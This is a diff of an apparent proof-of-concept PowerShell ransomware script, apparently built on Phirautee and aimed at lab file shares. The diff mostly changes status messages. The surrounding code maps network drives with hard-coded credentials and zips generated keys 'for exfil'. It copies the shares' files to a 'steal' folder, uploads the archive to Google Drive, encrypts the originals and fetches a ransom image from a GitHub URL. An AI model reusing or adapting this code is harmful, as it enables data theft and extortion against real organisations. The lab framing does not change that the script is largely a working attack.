@@ -7,11 +7,13 @@ $net.MapNetworkDrive("y:", "\\data-storage-3.mdpilots.lab\Pilot-Assignments", $f
 $net.MapNetworkDrive("z:", "\\data-storage-4.mdpilots.lab\Ship-Database", $false, "pilotdispatch", "pilotdispatch") | Out-Null
 
 $YOUR_NAME = "ECOTERROR"
-	
+
+Write-Host "[+] Creating self-signed certificate..."
 $cert = New-SelfSignedCertificate -DnsName $YOUR_NAME -CertStoreLocation "Cert:\CurrentUser\My" -KeyLength 2048 -HashAlgorithm "Sha384" -NotBefore ((Get-Date).AddDays(-1)) -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) -Type DocumentEncryptionCert -KeyUsage KeyEncipherment, DataEncipherment
 
 New-Item -ItemType Directory -Force -Path "C:\temp\" | Out-Null
 
+Write-Host "[+] Exporting certificate to temp location..."
 Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null
 
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -19,7 +21,7 @@ Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null
 #----------------------------------------------------------------------------------------------------------------------------------------
 $encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cert.cer"))
 
-# Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Blue
+Write-Host "\nBase64 encoded certificate: $encodedcert" -ForegroundColor Blue
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the certificate
@@ -30,15 +32,16 @@ $pwd2 = [system.web.security.membership]::GeneratePassword(32,15)
 echo ("$pwd2") > c:/temp/sys.txt
 # Write-Host "[+] $pwd2"
 # Start-Sleep -s 1
-# Write-Host "Installing NuGet provider..."
+Write-Host "\n[+] Installing provider dependency..."
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force | Out-Null
 
+Write-Host "[+] Grabbing additional dependencies..."
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
-Write-Host "[+] Compressing certificate password for exfil..." -ForegroundColor Green
+Write-Host "\n[+] Compressing certificate password for exfil..." -ForegroundColor White
 Compress-7Zip -Path c:/temp/sys.txt -ArchiveFileName c:/temp/backup.zip -Format Zip -Password "$IV11" | Out-Null
-Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
+Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor White
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Send certificate password via encrypted zip file to Pokemail e-mail
@@ -60,9 +63,9 @@ Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor White
 # Start-Sleep -s 2
-Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor White
 Remove-Item c:\temp\sys.txt
 Remove-Item c:\temp\backup.zip
 
@@ -73,9 +76,9 @@ Remove-Item c:\temp\backup.zip
 $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
-Write-Host "[+] Compressing zip password for exfil..." -ForegroundColor Green
+Write-Host "\n[+] Compressing target file encryption key for exfil..." -ForegroundColor White
 Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1" | Out-Null
-Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
+Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor White
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Send password for files to your e-mail
@@ -97,9 +100,9 @@ Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor White
 # Start-Sleep -s 2
-Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor White
 Remove-Item c:\temp\sys1.txt
 Remove-Item c:\temp\backup1.zip
 
@@ -110,7 +113,7 @@ $Source = "W:\"    # Replace $source with the files and folder you want to encry
 $Destination = "c:\temp\steal\w"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Green}
+{ Write-Host "$Destination already exists" -ForegroundColor White}
 ELSE
 { New-Item -Path $Destination -ItemType directory | Out-Null }
 
@@ -120,7 +123,7 @@ $Source = "X:\"    # Replace $source with the files and folder you want to encry
 $Destination = "c:\temp\steal\x"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Green}
+{ Write-Host "$Destination already exists" -ForegroundColor White}
 ELSE
 { New-Item -Path $Destination -ItemType directory | Out-Null }
 
@@ -130,7 +133,7 @@ $Source = "Y:\"    # Replace $source with the files and folder you want to encry
 $Destination = "c:\temp\steal\y"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Green}
+{ Write-Host "$Destination already exists" -ForegroundColor White}
 ELSE
 { New-Item -Path $Destination -ItemType directory | Out-Null }
 
@@ -139,7 +142,7 @@ $cp = robocopy /E $Source $Destination
 $Source = "Z:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\temp\steal\z"
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Green}
+{ Write-Host "$Destination already exists" -ForegroundColor White}
 ELSE
 { New-Item -Path $Destination -ItemType directory | Out-Null }
 
@@ -149,18 +152,19 @@ $cp = robocopy /E $Source $Destination
 $Destination = "C:\temp\steal"
 $files = Get-ChildItem -Path $Destination -Recurse
 
+Write-Host "[+] Moving target files to temp location for exfil..."
 For($i = 1; $i -le $files.count; $i++)
 
 { Write-Progress -Activity "“Collecting files” -status “Finding file $i”" -percentComplete ($i / $files.count*100)}
 
 # $files | Select name
-Write-Host "[+] Target files copied to temp location..." -ForegroundColor Green
+Write-Host "[+] Target files copied to temp location..." -ForegroundColor White
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1" | Out-Null 
 
 # Start-Sleep -s 5
-Write-Host "[+] Target files compressed to archive..." -ForegroundColor Green
+Write-Host "[+] Target files compressed to archive..." -ForegroundColor White
 #$del = Remove-Item $Destination -Force -Recurse
-Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor Green
+Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor White
 # Start-Sleep -s 5
 # $del = Remove-Item $Destination -Force -Recurse
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -230,11 +234,11 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 # Start-Sleep -s 10
-Write-Host "[-] Removing archive after upload..." -ForegroundColor Green
+Write-Host "[-] Upload complete. Deleting archive..." -ForegroundColor White
 Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
-Write-Host "[-] Archive deleted..." -ForegroundColor Green
-Write-Host "[+] Beginning target file encryption..." -ForegroundColor Green
+Write-Host "[-] Archive deleted..." -ForegroundColor White
+Write-Host "\n[+] Beginning target file encryption..." -ForegroundColor White
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypt files via Phirautee
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -300,13 +304,13 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
 $ransom = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
 Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
 
-Write-Host "[+] Target files encrypted..." -ForegroundColor Green
+Write-Host "\n\n[+] Target files encrypted..." -ForegroundColor White
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
 #echo (Protect-CmsMessage -Content $pwd -To "c:/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
 # Start-Sleep -s 10
 #remove-variable pwd
-# Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
+# Write-Host "[+] Intiating ransom UI..." -ForegroundColor White
 # [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
 # [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 # [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
